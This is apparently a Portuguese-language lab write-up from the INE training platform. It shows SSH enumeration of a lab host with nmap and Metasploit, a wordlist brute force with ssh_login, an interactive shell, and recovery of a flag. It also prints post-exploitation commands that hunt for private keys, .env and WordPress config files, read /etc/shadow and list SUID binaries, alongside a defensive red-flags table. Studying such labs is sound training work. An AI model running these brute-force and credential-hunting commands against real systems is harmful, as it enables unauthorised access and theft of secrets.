# 🧪 Lab Report — SSH Enumeration e Brute Force com Metasploit

> **Plataforma:** INE
> **Tema central:** Identificação de versão SSH → Brute force de credenciais → Sessão interativa → Extração de flag
> **Alvo:** `demo.ine.local`

---

## 🎯 Objetivo

Identificar a versão do serviço SSH, obter credenciais válidas via brute force, abrir uma sessão interativa e localizar um arquivo sensível no sistema de arquivos do alvo.

---

## 🧠 O Que é SSH e Por Que é um Alvo

SSH (Secure Shell) é o protocolo padrão para acesso remoto seguro a servidores Linux/Unix. Ao contrário do Telnet (texto claro), SSH criptografa a comunicação — mas isso não significa que seja invulnerável.

**Vetores de ataque contra SSH:**

| Vetor | Método | Quando Funciona |
|-------|--------|----------------|
| Brute force de senha | `ssh_login` | Sem lockout + senha fraca |
| Credencial padrão | `ssh_login` | root/root, admin/admin |
| Chave privada exposta | Conexão direta | Chave vazada via FTP, web, etc |
| Versão vulnerável | Exploit específico | SSH < versão com CVE |
| Username enumeration | `ssh_enumusers` | Versões antigas do OpenSSH |

> 💡 SSH com senha fraca + sem rate limiting é equivalente a uma porta aberta. O protocolo é seguro — a autenticação pode não ser.

---

## 📋 Sumário de Etapas

| # | Etapa | Módulo / Comando | Resultado |
|---|-------|-----------------|-----------|
| 1 | Conectividade | `ping` | Alvo acessível |
| 2 | Port scan + versão | `nmap -sS -sV` | SSH na porta 22 |
| 3 | Versão SSH | `ssh_version` | OpenSSH X.X |
| 4 | Brute force | `ssh_login` | Credencial válida |
| 5 | Sessão interativa | `sessions -i 1` | Shell no alvo |
| 6 | Extração da flag | `find` + `cat` | Flag localizada |

---

## 🔬 Execução Passo a Passo

### Step 1 — Verificar Conectividade

```bash
ping -c 4 demo.ine.local
```

**Por quê:** Confirmar que o alvo responde antes de qualquer scan. `-c 4` = 4 pacotes.

---

### Step 2 — Port Scan com Detecção de Versão

```bash
nmap -sS -sV demo.ine.local
```

**Por que `-sS -sV` juntos:**

| Flag | Função |
|------|--------|
| `-sS` | SYN scan — rápido e semi-stealth, não completa o handshake |
| `-sV` | Detecta versão dos serviços nas portas abertas |

Executar os dois juntos num scan inicial é mais eficiente do que dois scans separados. O SYN scan descobre as portas e o `-sV` já aproveita para identificar o que está rodando.

**Resultado:**
```
22/tcp  open  ssh  OpenSSH X.X (protocol 2.0)
```

> 💡 Ver qual versão do OpenSSH está rodando permite buscar CVEs específicos. Versões antigas podem ser vulneráveis a **username enumeration (CVE-2018-15473)**, onde respostas diferentes para usuários válidos e inválidos revelam contas existentes.

---

### Step 3 — Identificar Versão SSH com Metasploit

```bash
msfconsole

use auxiliary/scanner/ssh/ssh_version
set RHOSTS demo.ine.local
exploit
```

**O que faz:** Conecta na porta 22 e lê o banner de apresentação do servidor SSH — que inclui versão do software e protocolo **sem precisar autenticar**.

**Por que usar o módulo além do nmap:** O módulo do Metasploit pode extrair informações adicionais do handshake SSH, como algoritmos de criptografia suportados, que revelam configurações de segurança do servidor.

**Output típico:**
```
[+] demo.ine.local:22 - SSH server version: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
```

**O que extrair do banner:**

| Parte | Exemplo | Relevância |
|-------|---------|-----------|
| Protocolo | SSH-2.0 | SSHv1 = obsoleto e inseguro |
| Software | OpenSSH_7.2p2 | Buscar CVEs dessa versão |
| OS | Ubuntu-4ubuntu2.8 | Versão do sistema operacional |

---

### Step 4 — Brute Force de Credenciais SSH

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit
```

**Por que cada parâmetro:**

| Parâmetro | Valor | Por Quê |
|-----------|-------|---------|
| `USER_FILE` | common_users.txt | Testa múltiplos usuários — não sabemos o username |
| `PASS_FILE` | common_passwords.txt | Wordlist de senhas comuns |
| `STOP_ON_SUCCESS` | true | Para imediatamente ao encontrar credencial válida — evita ruído desnecessário |
| `VERBOSE` | true | Exibe cada tentativa — útil para ver o progresso e entender o comportamento |

**Diferença entre `STOP_ON_SUCCESS true` e `false`:**
- `true` → para no primeiro sucesso. Ideal quando você quer acesso rápido.
- `false` → continua após o primeiro. Útil para encontrar **todas** as credenciais válidas — pode haver múltiplas contas com senhas fracas.

**O que acontece internamente:** O módulo tenta conexão SSH real para cada par usuário:senha. Se autenticar com sucesso, **abre automaticamente uma sessão Meterpreter ou shell** — diferente dos módulos FTP/MySQL que só validam a credencial.

**Output quando encontra:**
```
[+] demo.ine.local:22 - Success: 'sysadmin:password123' 'uid=1001...'
[*] Command shell session 1 opened
```

> 💡 O `ssh_login` é especial — não apenas confirma a credencial, ele **abre a sessão automaticamente**. Isso é o que permite ir direto para o `sessions` no próximo passo.

---

### Step 5 — Acessar a Sessão e Localizar a Flag

```bash
# Ver sessões abertas
sessions

# Entrar na sessão
sessions -i 1

# Buscar arquivo chamado "flag" em todo o sistema
find / -name "flag"

# Ler o conteúdo
cat /flag
```

**Por que `find / -name "flag"`:**

| Parte | Função |
|-------|--------|
| `find` | Comando de busca recursiva |
| `/` | Começa da raiz — busca em todo o sistema de arquivos |
| `-name "flag"` | Procura por arquivo com esse nome exato |

**Alternativas de busca:**
```bash
# Busca case-insensitive
find / -iname "flag*"

# Buscar por conteúdo dentro dos arquivos
grep -r "flag" / 2>/dev/null

# Buscar arquivos recentemente modificados
find / -newer /etc/passwd -type f 2>/dev/null

# Buscar arquivos com permissão incomum
find / -perm -4000 -type f 2>/dev/null  # SUID files
```

**`2>/dev/null`** redireciona erros de permissão (`Permission denied`) para o lixo — sem isso, a tela fica poluída com erros de diretórios que o usuário não pode acessar.

**Resultado:**
```
/flag

eb09cc6f1cd72756da145892892fbf5a
```

---

## 📊 Resultado Final

| Informação | Valor |
|-----------|-------|
| Porta | 22/TCP |
| Versão | OpenSSH 7.2p2 Ubuntu |
| Protocolo | SSH-2.0 |
| Credencial | `sysadmin:password123` (exemplo) |
| Sessão aberta | ✅ Shell interativa |
| Flag | `eb09cc6f1cd72756da145892892fbf5a` |

---

## 🧠 Conceitos Consolidados

### ssh_login Abre Sessão Automaticamente
Diferente de `ftp_login` e `smb_login` que apenas validam credenciais, o `ssh_login` estabelece uma **conexão SSH real** e entrega uma sessão interativa. Isso acontece porque SSH é um protocolo de acesso remoto — ao autenticar com sucesso, você já tem um shell.

### Gerenciamento de Sessões no Metasploit

```bash
sessions          # listar todas as sessões abertas
sessions -i 1     # interagir com sessão 1
sessions -k 1     # encerrar sessão 1
sessions -K       # encerrar todas
background        # ou CTRL+Z — manda sessão para background
```

### find — Comando Essencial em Pós-Exploração

```bash
# Localizar arquivos sensíveis comuns
find / -name "*.conf" 2>/dev/null       # arquivos de config
find / -name "*.key" 2>/dev/null        # chaves privadas
find / -name "*.bak" 2>/dev/null        # backups
find / -name "id_rsa" 2>/dev/null       # chaves SSH
find / -name ".env" 2>/dev/null         # variáveis de ambiente
find / -name "wp-config.php" 2>/dev/null # config WordPress
find /home -name "*.txt" 2>/dev/null    # arquivos de texto em homes

# Arquivos com SUID (potencial privilege escalation)
find / -perm -4000 -type f 2>/dev/null
```

---

## ⚠️ Red Flags em Enumeração SSH

| Achado | Risco | Ação |
|--------|-------|------|
| OpenSSH versão antiga | 🔴 Alto | Verificar CVE-2018-15473 (user enum) |
| SSHv1 ativo | 🔴 Crítico | Protocolo obsoleto com vulnerabilidades conhecidas |
| root login habilitado | 🔴 Alto | `PermitRootLogin yes` no sshd_config |
| Sem rate limiting | 🔴 Alto | Brute force irrestrito |
| Senha fraca | 🔴 Crítico | Rotacionar imediatamente |
| Porta padrão 22 | 🟡 Baixo | Exposição desnecessária |

---

## 🔁 Próximos Passos Lógicos

```
Sessão SSH aberta como sysadmin
        ↓
id                    → verificar privilégios do usuário
sudo -l               → listar comandos sudo disponíveis
cat /etc/passwd       → usuários do sistema
cat /etc/shadow       → hashes (se root ou sudo)
        ↓
Privilege Escalation
        ↓
find / -perm -4000    → SUID files (vetores comuns: vim, bash, python)
sudo -l               → sudo sem senha?
uname -r              → versão do kernel → CVEs de kernel exploit
```

---

## 📌 Relacionados

- [[FTP Enumeration com Metasploit]]
- [[SMB Brute Force e Acesso a Shares]]
- [[Metasploit — Fundamentos e Arquitetura]]
- [[Metasploit — Banco de Dados e Workspaces]]
- [[Cheatsheet — Portas Importantes]]

#lab #exploração #ferramenta/metasploit #protocolo/ssh #brute-force #linux
